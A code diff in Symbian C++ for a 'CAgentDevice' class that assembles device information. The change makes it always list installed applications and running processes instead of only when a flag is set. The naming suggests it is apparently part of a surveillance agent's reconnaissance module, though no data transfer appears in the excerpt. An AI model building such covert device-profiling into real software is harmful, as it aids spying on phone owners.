@@ -64,14 +64,6 @@ void CAgentDevice::ConstructL(const TDesC8& params)
 	__FLOG_OPEN("HT", "Agent_Device.txt");
 	__FLOG(_L("-------------"));
 		
-	iList = EFalse;
-		
-	TUint8* ptr = (TUint8 *)iParams.Ptr();
-	TUint32 list = 0; 
-	Mem::Copy( &list, ptr, 4);
-	if (list == 1)
-		iList = ETrue;
-	
 	iPhone = CPhone::NewL();  
 	}
 
@@ -241,45 +233,42 @@ HBufC8* CAgentDevice::GetInfoBufferL()
 	buf.Zero();
 	buf.Format(KFormatUptime,days,hours,min);
 	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());
-		
-	if(iList)
+	
+	//list
+	RApaLsSession lsSession;
+	TApaAppInfo appInfo;
+	TApaAppCapabilityBuf capability;
+	// Applications list:
+	if( lsSession.Connect() == KErrNone)
 		{
-		RApaLsSession lsSession;
-		TApaAppInfo appInfo;
-		TApaAppCapabilityBuf capability;
-		//_LIT(KNewLine,"\n");
-		// Applications list:
-		if( lsSession.Connect() == KErrNone)
+		CleanupClosePushL( lsSession );
+		lsSession.GetAllApps();
+		_LIT(KAppList,"\nApplication List: \n");
+		buffer->InsertL(buffer->Size(),KAppList().Ptr(),KAppList().Size());
+		while( lsSession.GetNextApp( appInfo ) == KErrNone )
 			{
-			CleanupClosePushL( lsSession );
-			lsSession.GetAllApps();
-			_LIT(KAppList,"\nApplication List: \n");
-			buffer->InsertL(buffer->Size(),KAppList().Ptr(),KAppList().Size());
-			while( lsSession.GetNextApp( appInfo ) == KErrNone )
-				{
-				buffer->InsertL(buffer->Size(), appInfo.iCaption.Ptr(), appInfo.iCaption.Size());
-				buffer->InsertL(buffer->Size(),KNewLine().Ptr(),KNewLine().Size());
-				}
-			CleanupStack::PopAndDestroy(&lsSession);
+			buffer->InsertL(buffer->Size(), appInfo.iCaption.Ptr(), appInfo.iCaption.Size());
+			buffer->InsertL(buffer->Size(),KNewLine().Ptr(),KNewLine().Size());
 			}
-		// Running processes
-		TFullName res;
-		TFindProcess proc;
-		_LIT(KProcList,"\nProcesses List:\n");
-		buffer->InsertL(buffer->Size(),KProcList().Ptr(),KProcList().Size());
-		while(proc.Next(res) == KErrNone)
-		    {
-		      	RProcess ph;
-		      	TInt err = ph.Open(proc);
-		      	if(err!=KErrNone)
-		      		{
-					continue;
-		      		}
-		      	buffer->InsertL(buffer->Size(),ph.Name().Ptr(),ph.Name().Size());
-		      	buffer->InsertL(buffer->Size(),KNewLine().Ptr(),KNewLine().Size());
-		      	ph.Close();
-		    }
+		CleanupStack::PopAndDestroy(&lsSession);
 		}
+	// Running processes
+	TFullName res;
+	TFindProcess proc;
+	_LIT(KProcList,"\nProcesses List:\n");
+	buffer->InsertL(buffer->Size(),KProcList().Ptr(),KProcList().Size());
+	while(proc.Next(res) == KErrNone)
+	    {
+	   	RProcess ph;
+	   	TInt err = ph.Open(proc);
+	    if(err!=KErrNone)
+	  		{
+			continue;
+     		}
+      	buffer->InsertL(buffer->Size(),ph.Name().Ptr(),ph.Name().Size());
+      	buffer->InsertL(buffer->Size(),KNewLine().Ptr(),KNewLine().Size());
+     	ph.Close();
+	    }
 	
 	HBufC8* result = buffer->Ptr(0).AllocL();
 	CleanupStack::PopAndDestroy(buffer);
